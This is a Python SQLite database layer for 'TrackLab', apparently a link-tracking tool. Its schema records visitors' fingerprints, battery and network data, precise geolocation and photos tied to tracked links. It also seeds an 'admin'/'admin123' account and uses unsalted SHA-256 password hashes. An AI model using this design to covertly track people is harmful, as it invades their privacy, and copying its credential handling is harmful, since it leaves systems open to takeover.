"""
TrackLab — Database Layer
SQLite com tabelas: sessions, photos, links, link_hits, alerts, users
"""
import sqlite3
import hashlib
import os
from datetime import datetime

DB_PATH = os.path.join(os.path.dirname(__file__), '..', 'database', 'tracklab.db')

SCHEMA = """
PRAGMA journal_mode=WAL;
PRAGMA foreign_keys=ON;

CREATE TABLE IF NOT EXISTS users (
    id          INTEGER PRIMARY KEY AUTOINCREMENT,
    username    TEXT UNIQUE NOT NULL,
    password    TEXT NOT NULL,
    role        TEXT DEFAULT 'viewer',  -- admin | viewer
    created_at  TEXT DEFAULT (datetime('now'))
);

CREATE TABLE IF NOT EXISTS sessions (
    id            INTEGER PRIMARY KEY AUTOINCREMENT,
    session_id    TEXT UNIQUE NOT NULL,
    ip            TEXT,
    ip_country    TEXT,
    ip_city       TEXT,
    ip_isp        TEXT,
    user_agent    TEXT,
    browser       TEXT,
    browser_ver   TEXT,
    os            TEXT,
    os_ver        TEXT,
    device_type   TEXT,
    screen        TEXT,
    viewport      TEXT,
    color_depth   INTEGER,
    pixel_ratio   REAL,
    language      TEXT,
    languages     TEXT,
    timezone      TEXT,
    cpu_cores     INTEGER,
    memory_gb     REAL,
    touch_points  INTEGER,
    cookies       INTEGER,
    dnt           INTEGER,
    online        INTEGER,
    webgl         TEXT,
    fingerprint   TEXT,
    canvas_hash   TEXT,
    fonts         TEXT,
    plugins       TEXT,
    ref_link_id   TEXT,
    geo_lat       REAL,
    geo_lng       REAL,
    geo_accuracy  REAL,
    geo_city      TEXT,
    battery_level REAL,
    battery_charging INTEGER,
    connection_type TEXT,
    connection_speed REAL,
    has_photo     INTEGER DEFAULT 0,
    created_at    TEXT DEFAULT (datetime('now')),
    FOREIGN KEY (ref_link_id) REFERENCES tracked_links(link_id)
);

CREATE TABLE IF NOT EXISTS photos (
    id          INTEGER PRIMARY KEY AUTOINCREMENT,
    session_id  TEXT NOT NULL,
    data_url    TEXT NOT NULL,
    width       INTEGER,
    height      INTEGER,
    size_bytes  INTEGER,
    created_at  TEXT DEFAULT (datetime('now')),
    FOREIGN KEY (session_id) REFERENCES sessions(session_id)
);

CREATE TABLE IF NOT EXISTS tracked_links (
    id          INTEGER PRIMARY KEY AUTOINCREMENT,
    link_id     TEXT UNIQUE NOT NULL,
    name        TEXT NOT NULL,
    description TEXT,
    target_url  TEXT DEFAULT '/',
    active      INTEGER DEFAULT 1,
    total_hits  INTEGER DEFAULT 0,
    unique_hits INTEGER DEFAULT 0,
    created_by  TEXT,
    created_at  TEXT DEFAULT (datetime('now')),
    expires_at  TEXT
);

CREATE TABLE IF NOT EXISTS link_hits (
    id          INTEGER PRIMARY KEY AUTOINCREMENT,
    link_id     TEXT NOT NULL,
    session_id  TEXT,
    ip          TEXT,
    user_agent  TEXT,
    referer     TEXT,
    created_at  TEXT DEFAULT (datetime('now')),
    FOREIGN KEY (link_id) REFERENCES tracked_links(link_id)
);

CREATE TABLE IF NOT EXISTS alerts (
    id          INTEGER PRIMARY KEY AUTOINCREMENT,
    type        TEXT NOT NULL,   -- new_session | new_photo | new_link_hit | geo_detected
    session_id  TEXT,
    message     TEXT,
    read        INTEGER DEFAULT 0,
    created_at  TEXT DEFAULT (datetime('now'))
);

CREATE TABLE IF NOT EXISTS api_keys (
    id          INTEGER PRIMARY KEY AUTOINCREMENT,
    key_hash    TEXT UNIQUE NOT NULL,
    label       TEXT,
    active      INTEGER DEFAULT 1,
    last_used   TEXT,
    created_at  TEXT DEFAULT (datetime('now'))
);

-- Indexes
CREATE INDEX IF NOT EXISTS idx_sessions_created ON sessions(created_at);
CREATE INDEX IF NOT EXISTS idx_sessions_fingerprint ON sessions(fingerprint);
CREATE INDEX IF NOT EXISTS idx_sessions_ip ON sessions(ip);
CREATE INDEX IF NOT EXISTS idx_photos_session ON photos(session_id);
CREATE INDEX IF NOT EXISTS idx_link_hits_link ON link_hits(link_id);
CREATE INDEX IF NOT EXISTS idx_alerts_read ON alerts(read);
"""

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    os.makedirs(os.path.dirname(DB_PATH), exist_ok=True)
    conn = get_db()
    conn.executescript(SCHEMA)
    # Default admin user
    pw = hashlib.sha256(b'admin123').hexdigest()
    conn.execute("INSERT OR IGNORE INTO users (username, password, role) VALUES (?, ?, ?)",
                 ('admin', pw, 'admin'))
    conn.commit()
    conn.close()
    print(f"[DB] Initialized at {DB_PATH}")

def hash_password(pw: str) -> str:
    return hashlib.sha256(pw.encode()).hexdigest()

def db_stats():
    conn = get_db()
    stats = {
        'total_sessions':  conn.execute("SELECT COUNT(*) FROM sessions").fetchone()[0],
        'total_photos':    conn.execute("SELECT COUNT(*) FROM photos").fetchone()[0],
        'total_links':     conn.execute("SELECT COUNT(*) FROM tracked_links").fetchone()[0],
        'total_hits':      conn.execute("SELECT COALESCE(SUM(total_hits),0) FROM tracked_links").fetchone()[0],
        'with_geo':        conn.execute("SELECT COUNT(*) FROM sessions WHERE geo_lat IS NOT NULL").fetchone()[0],
        'with_photo':      conn.execute("SELECT COUNT(*) FROM sessions WHERE has_photo=1").fetchone()[0],
        'unread_alerts':   conn.execute("SELECT COUNT(*) FROM alerts WHERE read=0").fetchone()[0],
        'unique_ips':      conn.execute("SELECT COUNT(DISTINCT ip) FROM sessions").fetchone()[0],
        'unique_fps':      conn.execute("SELECT COUNT(DISTINCT fingerprint) FROM sessions WHERE fingerprint IS NOT NULL").fetchone()[0],
        'sessions_today':  conn.execute("SELECT COUNT(*) FROM sessions WHERE date(created_at)=date('now')").fetchone()[0],
        'browsers': dict(conn.execute(
            "SELECT browser, COUNT(*) FROM sessions WHERE browser IS NOT NULL GROUP BY browser ORDER BY 2 DESC LIMIT 6"
        ).fetchall()),
        'os_dist': dict(conn.execute(
            "SELECT os, COUNT(*) FROM sessions WHERE os IS NOT NULL GROUP BY os ORDER BY 2 DESC LIMIT 6"
        ).fetchall()),
        'devices': dict(conn.execute(
            "SELECT device_type, COUNT(*) FROM sessions WHERE device_type IS NOT NULL GROUP BY device_type"
        ).fetchall()),
        'sessions_by_hour': conn.execute(
            "SELECT strftime('%H',created_at) as h, COUNT(*) as c FROM sessions GROUP BY h ORDER BY h"
        ).fetchall(),
        'sessions_by_day': conn.execute(
            "SELECT date(created_at) as d, COUNT(*) as c FROM sessions GROUP BY d ORDER BY d DESC LIMIT 14"
        ).fetchall(),
    }
    conn.close()
    return stats
